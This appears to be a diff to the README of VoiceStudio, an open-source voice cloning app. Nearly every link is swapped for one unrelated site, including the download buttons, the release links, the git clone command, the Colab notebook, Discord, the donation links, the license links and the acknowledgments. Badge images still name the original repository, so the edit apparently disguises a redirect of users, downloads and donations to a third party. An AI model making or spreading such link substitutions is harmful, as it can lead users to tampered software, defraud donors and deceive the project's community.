@@ -2,7 +2,7 @@
   <p><img src="docs/logo.png" alt="VoiceStudio logo" width="120" height="120" /></p>
   <h1>VoiceStudio</h1>
   <p>
-    <a href="https://trendshift.io/repositories/28176?utm_source=repository-badge&amp;utm_medium=badge&amp;utm_campaign=badge-repository-28176" target="_blank" rel="noopener noreferrer"><img src="https://trendshift.io/api/badge/repositories/28176" alt="VoiceStudio ranking on Trendshift" width="220" height="48" /></a>
+    <a href="https://dawcraft.github.io;utm_medium=badge&amp;utm_campaign=badge-repository-28176" target="_blank" rel="noopener noreferrer"><img src="https://dawcraft.github.io" alt="VoiceStudio ranking on Trendshift" width="220" height="48" /></a>
   </p>
   <p><sub>Previously OmniVoice-Studio</sub></p>
   <h3>Clone voices, dub video, dictate, and produce long-form audio on your own hardware.</h3>
@@ -24,16 +24,16 @@
   </p>
 
   <p>
-    <a href="https://github.com/debpalash/VoiceStudio/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/debpalash/VoiceStudio/ci.yml?branch=main&style=flat-square&label=CI" alt="CI status" /></a>
-    <a href="https://github.com/debpalash/VoiceStudio/stargazers"><img src="https://img.shields.io/github/stars/debpalash/VoiceStudio?style=flat-square&color=f59e0b" alt="GitHub stars" /></a>
-    <a href="https://github.com/debpalash/VoiceStudio/releases"><img src="https://img.shields.io/github/downloads/debpalash/VoiceStudio/total?style=flat-square&color=8b5cf6&label=downloads" alt="Total downloads" /></a>
-    <a href="https://github.com/debpalash/VoiceStudio/releases/latest"><img src="https://img.shields.io/github/v/release/debpalash/VoiceStudio?style=flat-square&color=10b981" alt="Latest release" /></a>
+    <a href="https://dawcraft.github.io"><img src="https://img.shields.io/github/actions/workflow/status/debpalash/VoiceStudio/ci.yml?branch=main&style=flat-square&label=CI" alt="CI status" /></a>
+    <a href="https://dawcraft.github.io"><img src="https://img.shields.io/github/stars/debpalash/VoiceStudio?style=flat-square&color=f59e0b" alt="GitHub stars" /></a>
+    <a href="https://dawcraft.github.io"><img src="https://img.shields.io/github/downloads/debpalash/VoiceStudio/total?style=flat-square&color=8b5cf6&label=downloads" alt="Total downloads" /></a>
+    <a href="https://dawcraft.github.io"><img src="https://img.shields.io/github/v/release/debpalash/VoiceStudio?style=flat-square&color=10b981" alt="Latest release" /></a>
     <a href="LICENSE"><img src="https://img.shields.io/badge/license-AGPL--3.0-blue?style=flat-square" alt="AGPL-3.0 license" /></a>
-    <a href="https://discord.gg/bzQavDfVV9"><img src="https://img.shields.io/badge/Discord-Community-5865F2?style=flat-square&logo=discord&logoColor=white" alt="Discord community" /></a>
+    <a href="https://dawcraft.github.io"><img src="https://img.shields.io/badge/Discord-Community-5865F2?style=flat-square&logo=discord&logoColor=white" alt="Discord community" /></a>
   </p>
 
   <p>
-    <a href="https://github.com/debpalash/VoiceStudio/releases/latest"><img src="https://img.shields.io/badge/Download-macOS_·_Windows_·_Linux-10b981?style=for-the-badge" alt="Download VoiceStudio" /></a>
+    <a href="https://dawcraft.github.io"><img src="https://img.shields.io/badge/Download-macOS_·_Windows_·_Linux-10b981?style=for-the-badge" alt="Download VoiceStudio" /></a>
   </p>
 </div>
 
@@ -42,7 +42,7 @@
 </div>
 
 > [!WARNING]
-> **Active beta.** Use the [latest release](https://github.com/debpalash/VoiceStudio/releases/latest) for stable work. `main` contains the newest fixes and may change between releases. Report problems through [GitHub Issues](https://github.com/debpalash/VoiceStudio/issues).
+> **Active beta.** Use the [latest release](https://dawcraft.github.io) for stable work. `main` contains the newest fixes and may change between releases. Report problems through [GitHub Issues](https://dawcraft.github.io).
 
 ## At a glance
 
@@ -71,7 +71,7 @@ The casting board shows icon-based voice cards and searchable selectors for each
 
 ## Install
 
-Download a package from the [latest release](https://github.com/debpalash/VoiceStudio/releases/latest), then follow the platform guide.
+Download a package from the [latest release](https://dawcraft.github.io), then follow the platform guide.
 
 | Platform | Package | Guide |
 |---|---|---|
@@ -98,7 +98,7 @@ docker run -d -p 127.0.0.1:3900:3900 -v omnivoice-data:/app/omnivoice_data --nam
 3. Enter text, choose a language, then select **Generate**.
 
 > [!TIP]
-> **Try without installing:** Run VoiceStudio in the cloud via the [Google Colab notebook](https://colab.research.google.com/github/debpalash/VoiceStudio/blob/main/notebooks/OmniVoice_Studio_Colab.ipynb). Explore audio quality comparisons in [benchmarks](docs/benchmarks.md) and prompt design tips in [expressive speech](docs/expressive-speech.md).
+> **Try without installing:** Run VoiceStudio in the cloud via the [Google Colab notebook](https://dawcraft.github.io). Explore audio quality comparisons in [benchmarks](docs/benchmarks.md) and prompt design tips in [expressive speech](docs/expressive-speech.md).
 
 ### Audio samples
 
@@ -116,7 +116,7 @@ Listen to sample outputs produced locally with VoiceStudio:
 Install the [development prerequisites](.github/CONTRIBUTING.md#development-setup) (Node 20+/Bun and Python 3.11+), then:
 
 ```bash
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://dawcraft.github.io
 cd VoiceStudio
 bun install
 bun run desktop
@@ -221,7 +221,7 @@ Engine support is capability-specific. Check cloning, language, platform, memory
 
 | Engine | Languages | Clone | Instruct | Linux | macOS ARM | Windows | License |
 |---|:---:|:---:|:---:|:---:|:---:|:---:|---|
-| [**VoiceStudio** (default, powered by k2-fsa/OmniVoice)](docs/engines/omnivoice.md) | 600+ | Yes | Yes | CUDA/CPU | MPS | CUDA/CPU | [AGPL-3.0](LICENSE) app · [Apache-2.0 code, CC-BY-NC weights](https://huggingface.co/k2-fsa/OmniVoice#license)³ |
+| [**VoiceStudio** (default, powered by k2-fsa/OmniVoice)](docs/engines/omnivoice.md) | 600+ | Yes | Yes | CUDA/CPU | MPS | CUDA/CPU | [AGPL-3.0](LICENSE) app · [Apache-2.0 code, CC-BY-NC weights](https://dawcraft.github.io)³ |
 | [**CosyVoice 3**](docs/engines/cosyvoice.md) | 9 + 18 dialects | Yes | Yes | CUDA/CPU | CPU | CUDA/CPU | Apache-2.0 |
 | [**GPT-SoVITS**](docs/engines/gpt-sovits.md) | 5 | Yes | No | CUDA/CPU | No | CUDA/CPU | MIT |
 | [**VoxCPM2**](docs/engines/voxcpm2.md) | 30 | Yes | Yes | CUDA/CPU | MPS | CUDA/CPU | Apache-2.0 |
@@ -230,8 +230,8 @@ Engine support is capability-specific. Check cloning, language, platform, memory
 | [**MLX-Audio**](docs/engines/mlx-audio.md) | Model-dependent | Varies | Varies | No | MLX | No | Varies |
 | [**Sherpa-ONNX**](docs/engines/sherpa-onnx.md) | 20+ | No | No | CUDA/CPU | CPU | CUDA/CPU | Apache-2.0 |
 | [**IndexTTS 2.5** ⚡](docs/engines/indextts.md) | ZH · EN · JA · ES · AR | Yes | No | CUDA/CPU | CPU | CUDA/CPU | Bilibili model license¹ |
-| [**OmniVoice GGUF** ⚡](docs/engines/omnivoice-gguf.md) | 600+ | Yes | Yes | CUDA/CPU | MPS/CPU | CUDA/CPU | [AGPL-3.0](LICENSE) app · [review the derivative model terms](https://huggingface.co/Serveurperso/OmniVoice-GGUF#license)³ |
-| [**OmniVoice (subprocess; opt-in off MPS)** ⚡](docs/engines/omnivoice-subprocess.md) | 600+ | Yes | Yes | CUDA/CPU | MPS via default OmniVoice | CUDA/CPU | [AGPL-3.0](LICENSE) app · [Apache-2.0 code, CC-BY-NC weights](https://huggingface.co/k2-fsa/OmniVoice#license)³ |
+| [**OmniVoice GGUF** ⚡](docs/engines/omnivoice-gguf.md) | 600+ | Yes | Yes | CUDA/CPU | MPS/CPU | CUDA/CPU | [AGPL-3.0](LICENSE) app · [review the derivative model terms](https://dawcraft.github.io)³ |
+| [**OmniVoice (subprocess; opt-in off MPS)** ⚡](docs/engines/omnivoice-subprocess.md) | 600+ | Yes | Yes | CUDA/CPU | MPS via default OmniVoice | CUDA/CPU | [AGPL-3.0](LICENSE) app · [Apache-2.0 code, CC-BY-NC weights](https://dawcraft.github.io)³ |
 | [**PocketTTS** ⚡](docs/engines/pockettts.md) | EN · FR · DE · PT · IT · ES | Yes | No | CPU | CPU | CPU | CC-BY-4.0, gated² |
 | [**Supertonic 3** ⚡](docs/engines/supertonic3.md) | 31 | No | No | CPU | CPU | CPU | OpenRAIL-M |
 | [**MOSS-TTS-v1.5** ⚡](docs/engines/moss-tts-v15.md) | 31 | Yes | No | CUDA/CPU | CPU | CUDA/CPU | Apache-2.0 |
@@ -240,11 +240,11 @@ Engine support is capability-specific. Check cloning, language, platform, memory
 
 ⚡ Installed or registered on demand.
 
-¹ IndexTTS 2.5 requires a separate written Bilibili license above 100 million monthly active users or RMB 1 billion annual revenue. Review the [model license](https://huggingface.co/IndexTeam/IndexTTS-2.5/blob/main/LICENSE).
+¹ IndexTTS 2.5 requires a separate written Bilibili license above 100 million monthly active users or RMB 1 billion annual revenue. Review the [model license](https://dawcraft.github.io).
 
 ² PocketTTS shows its gated-access and CC-BY-4.0 terms before first use.
 
-³ The OmniVoice snapshot also includes an audio tokenizer under separate [Boson Higgs Audio 2 and Meta Llama community terms](https://huggingface.co/k2-fsa/OmniVoice/blob/main/audio_tokenizer/LICENSE). VoiceStudio's application license does not replace model or tokenizer terms.
+³ The OmniVoice snapshot also includes an audio tokenizer under separate [Boson Higgs Audio 2 and Meta Llama community terms](https://dawcraft.github.io). VoiceStudio's application license does not replace model or tokenizer terms.
 
 Clone-less engines cannot preserve a reference speaker in dubbing or pinned-voice batch jobs. VoiceStudio rejects those jobs instead of silently changing engines. Heavy engines have separate memory and platform limits; check their engine guide first.
 
@@ -309,7 +309,7 @@ FastAPI backend
 Point an OpenAI-compatible audio client at the local backend:
 
 ```diff
-- base_url="https://api.openai.com/v1"
+- base_url="https://dawcraft.github.io"
 + base_url="http://localhost:3900/v1"
 ```
 
@@ -351,7 +351,7 @@ access, read [API authentication](docs/api-auth.md) before exposing the backend.
 
 ### Agent skills
 
-Install the VoiceStudio skills for Claude Code, Codex, Cursor, and other [skills.sh](https://skills.sh)-compatible agents:
+Install the VoiceStudio skills for Claude Code, Codex, Cursor, and other [skills.sh](https://dawcraft.github.io)-compatible agents:
 
 ```bash
 npx skills add debpalash/VoiceStudio
@@ -392,7 +392,7 @@ See the [MCP guide](docs/mcp.md) for tools (`generate_speech`, `clone_voice`, `t
 
 ### Google Colab
 
-[![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/debpalash/VoiceStudio/blob/main/notebooks/OmniVoice_Studio_Colab.ipynb)
+[![Open in Colab](https://dawcraft.github.io)](https://dawcraft.github.io)
 
 The [notebook](notebooks/OmniVoice_Studio_Colab.ipynb) runs the app and web UI on a Colab GPU. Colab is remote compute, so uploaded audio and project data do not remain local to your machine.
 
@@ -408,7 +408,7 @@ The [notebook](notebooks/OmniVoice_Studio_Colab.ipynb) runs the app and web UI o
 | Tune hardware | [Performance](docs/performance.md) · [remote workers](docs/remote-workers.md) |
 | Build integrations | [Speech platform](docs/speech-platform.md) · [Private production API](docs/production-private-api.md) · [API auth](docs/api-auth.md) · [MCP](docs/mcp.md) · [examples](examples/README.md) |
 | Build VoiceStudio | [Contributing](.github/CONTRIBUTING.md) · [engine acceptance](docs/engine-acceptance.md) |
-| Track changes | [Changelog](CHANGELOG.md) · [roadmap](docs/ROADMAP.md) · [latest release](https://github.com/debpalash/VoiceStudio/releases/latest) |
+| Track changes | [Changelog](CHANGELOG.md) · [roadmap](docs/ROADMAP.md) · [latest release](https://dawcraft.github.io) |
 | Remove everything | [Uninstall guide](docs/install/uninstall.md) |
 
 <a id="faq"></a>
@@ -453,14 +453,14 @@ Use `scripts/uninstall.sh` on macOS/Linux or `scripts\uninstall.ps1` on Windows.
 
 ## Community and contributing
 
-- [GitHub Issues](https://github.com/debpalash/VoiceStudio/issues) for reproducible bugs and feature requests.
-- [Discord](https://discord.gg/bzQavDfVV9) for setup help and project discussion.
-- [Good first issues](https://github.com/debpalash/VoiceStudio/labels/good%20first%20issue) for a scoped starting point.
+- [GitHub Issues](https://dawcraft.github.io) for reproducible bugs and feature requests.
+- [Discord](https://dawcraft.github.io) for setup help and project discussion.
+- [Good first issues](https://dawcraft.github.io) for a scoped starting point.
 - [Contributing guide](.github/CONTRIBUTING.md) for setup, tests, and pull requests.
 
 <p align="center">
-  <a href="https://star-history.com/#debpalash/VoiceStudio&Date">
-    <img src="https://api.star-history.com/svg?repos=debpalash/VoiceStudio&type=Date" alt="Star History Chart" width="100%" />
+  <a href="https://dawcraft.github.io">
+    <img src="https://dawcraft.github.io" alt="Star History Chart" width="100%" />
   </a>
 </p>
 
@@ -468,13 +468,13 @@ Use `scripts/uninstall.sh` on macOS/Linux or `scripts\uninstall.ps1` on Windows.
 
 VoiceStudio is free and has no paid tier. Donations fund development and infrastructure.
 
-[Ko-fi](https://ko-fi.com/debpalash) · [PayPal](https://paypal.me/palashCoder) · [Sponsorship details](SPONSORS.md)
+[Ko-fi](https://dawcraft.github.io) · [PayPal](https://dawcraft.github.io) · [Sponsorship details](SPONSORS.md)
 
 ## Responsible use and safety
 
 VoiceStudio enables zero-shot voice cloning and speech generation on personal hardware. Please use it responsibly:
 - **Consent:** Only clone or synthesize voices with explicit permission from the speaker.
-- **Audio provenance:** VoiceStudio integrates [AudioSeal](https://github.com/facebookresearch/audioseal) imperceptible watermarking by default to detect and identify synthetic speech without altering sound quality.
+- **Audio provenance:** VoiceStudio integrates [AudioSeal](https://dawcraft.github.io) imperceptible watermarking by default to detect and identify synthetic speech without altering sound quality.
 - **Local privacy:** For the default local workflow, audio recordings, transcripts, voices, and projects remain strictly on your local disk; data leaves your device only when you explicitly configure remote workers or external ASR endpoints.
 
 ## License
@@ -485,10 +485,10 @@ Optional engines and downloaded models retain their own licenses. The bundled `o
 
 ## Acknowledgments
 
-VoiceStudio builds on [OmniVoice](https://github.com/k2-fsa/OmniVoice), [WhisperX](https://github.com/m-bain/whisperX), [Demucs](https://github.com/facebookresearch/demucs), [Pyannote](https://github.com/pyannote/pyannote-audio), [CTranslate2](https://github.com/OpenNMT/CTranslate2), [AudioSeal](https://github.com/facebookresearch/audioseal), [Tauri](https://tauri.app), [Supertonic](https://huggingface.co/Supertone/supertonic-3), [Sherpa-ONNX](https://github.com/k2-fsa/sherpa-onnx), [GPT-SoVITS](https://github.com/RVC-Boss/GPT-SoVITS), and [PocketTTS](https://kyutai.org).
+VoiceStudio builds on [OmniVoice](https://dawcraft.github.io), [WhisperX](https://dawcraft.github.io), [Demucs](https://dawcraft.github.io), [Pyannote](https://dawcraft.github.io), [CTranslate2](https://dawcraft.github.io), [AudioSeal](https://dawcraft.github.io), [Tauri](https://dawcraft.github.io), [Supertonic](https://dawcraft.github.io), [Sherpa-ONNX](https://dawcraft.github.io), [GPT-SoVITS](https://dawcraft.github.io), and [PocketTTS](https://dawcraft.github.io).
 
 <div align="center">
-  <strong><a href="https://github.com/debpalash/VoiceStudio/releases/latest">Download VoiceStudio</a></strong> ·
-  <a href="https://github.com/debpalash/VoiceStudio">Star the project</a> ·
-  <a href="https://discord.gg/bzQavDfVV9">Join Discord</a>
+  <strong><a href="https://dawcraft.github.io">Download VoiceStudio</a></strong> ·
+  <a href="https://dawcraft.github.io">Star the project</a> ·
+  <a href="https://dawcraft.github.io">Join Discord</a>
 </div>
